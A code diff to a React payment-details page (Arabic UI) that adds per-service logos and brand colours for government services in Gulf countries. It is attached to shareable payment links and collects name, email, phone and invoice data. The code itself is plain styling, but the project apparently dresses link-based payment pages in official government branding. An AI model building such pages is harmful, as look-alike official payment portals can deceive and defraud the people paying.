@@ -9,6 +9,7 @@ import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@
 import { getCountryByCode } from "@/lib/countries";
 import { getGovernmentServicesByCountry } from "@/lib/gccGovernmentServices";
 import { getCurrencySymbol, formatCurrency } from "@/lib/countryCurrencies";
+import { getServiceBranding } from "@/lib/serviceLogos";
 import PaymentMetaTags from "@/components/PaymentMetaTags";
 import { useLink, useUpdateLink } from "@/hooks/useSupabase";
 import { ArrowLeft, User, Mail, Phone, CreditCard, Hash } from "lucide-react";
@@ -38,6 +39,20 @@ const PaymentData = () => {
   const countryData = getCountryByCode(countryCode);
   const phoneCode = countryData?.phoneCode || "+966";
   const phonePlaceholder = countryData?.phonePlaceholder || "5X XXX XXXX";
+
+  // Get service branding for unified design
+  const branding = getServiceBranding(serviceKey);
+  const colors = {
+    primary: branding.colors?.primary || "#CE1126",
+    secondary: branding.colors?.secondary || "#00732F",
+    accent: branding.colors?.accent || "#000000",
+    background: branding.colors?.background || "#FFFFFF",
+    surface: branding.colors?.surface || "#F5F5F5",
+    border: branding.colors?.border || "#E0E0E0",
+    text: branding.colors?.text || "#000000",
+    textLight: branding.colors?.textLight || "#666666",
+    textOnPrimary: branding.colors?.textOnPrimary || "#FFFFFF",
+  };
 
   // Get government services for the country
   const governmentServices = useMemo(
@@ -118,10 +133,25 @@ const PaymentData = () => {
         <div
           className="relative w-full h-48 sm:h-64 overflow-hidden"
           style={{
-            background: `linear-gradient(135deg, ${countryData?.primaryColor}, ${countryData?.secondaryColor})`,
+            background: `linear-gradient(135deg, ${colors.primary}, ${colors.secondary})`,
           }}
         >
           <div className="absolute inset-0 bg-black/30" />
+          
+          {/* Logo Overlay */}
+          {branding.logo && (
+            <div className="absolute top-4 left-4 sm:top-6 sm:left-6">
+              <div className="bg-white rounded-2xl p-3 sm:p-4 shadow-lg">
+                <img 
+                  src={branding.logo} 
+                  alt={serviceName}
+                  className="h-12 sm:h-16 w-auto"
+                  onError={(e) => e.currentTarget.style.display = 'none'}
+                />
+              </div>
+            </div>
+          )}
+          
           <div className="absolute bottom-4 right-4 sm:bottom-6 sm:right-6 text-white">
             <div className="text-right">
               <h2 className="text-lg sm:text-2xl font-bold mb-1">{serviceName}</h2>
@@ -132,7 +162,7 @@ const PaymentData = () => {
 
         <div className="container mx-auto px-3 sm:px-4 -mt-8 sm:-mt-12 relative z-10">
           <div className="max-w-2xl mx-auto">
-            <Card className="p-4 sm:p-8 shadow-2xl border-t-4" style={{ borderTopColor: countryData?.primaryColor }}>
+            <Card className="p-4 sm:p-8 shadow-2xl border-t-4" style={{ borderTopColor: colors.primary }}>
               <form onSubmit={handleProceed}>
                 <div className="flex items-center justify-between mb-6 sm:mb-8">
                   <h1 className="text-xl sm:text-3xl font-bold">إكمال بيانات السداد</h1>
@@ -140,7 +170,7 @@ const PaymentData = () => {
                   <div
                     className="w-14 h-14 sm:w-20 sm:h-20 rounded-2xl flex items-center justify-center shadow-lg"
                     style={{
-                      background: `linear-gradient(135deg, ${countryData?.primaryColor}, ${countryData?.secondaryColor})`,
+                      background: `linear-gradient(135deg, ${colors.primary}, ${colors.secondary})`,
                     }}
                   >
                     <CreditCard className="w-7 h-7 sm:w-10 sm:h-10 text-white" />
@@ -262,9 +292,11 @@ const PaymentData = () => {
                 <Button
                   type="submit"
                   size="lg"
-                  className="w-full text-sm sm:text-lg py-5 sm:py-7 text-white"
+                  className="w-full text-sm sm:text-lg py-5 sm:py-7 text-white hover:opacity-90 transition-all"
                   style={{
-                    background: `linear-gradient(135deg, ${countryData?.primaryColor}, ${countryData?.secondaryColor})`
+                    background: `linear-gradient(135deg, ${colors.primary}, ${colors.secondary})`,
+                    borderRadius: '12px',
+                    boxShadow: '0 4px 12px rgba(0,0,0,0.15)'
                   }}
                   disabled={!customerName || !customerEmail || !customerPhone || !invoiceNumber || !selectedService || !paymentAmount}
                 >
